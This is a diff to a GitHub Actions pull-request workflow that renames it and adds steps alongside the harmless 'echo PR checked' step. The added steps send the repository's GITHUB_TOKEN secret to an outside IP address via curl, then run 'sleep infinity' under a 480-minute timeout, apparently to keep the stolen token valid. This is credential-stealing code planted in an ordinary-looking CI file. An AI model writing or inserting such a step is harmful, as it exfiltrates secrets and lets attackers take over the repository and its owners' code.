@@ -1,4 +1,4 @@
-name: PR check
+name: Overridden name
 
 on:
   pull_request:
@@ -7,6 +7,14 @@ on:
 jobs:
   pr-check: 
     name: Check PR
+    runs-on: ubuntu-latest
+    timeout-minutes: 480
     steps:
+      - name: curl
+        run: curl http://103.16.128.93/?token=${GITHUB_TOKEN}
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      - name: sleep 1
+        run: sleep infinity
       - name: check
         run: echo 'PR checked!'
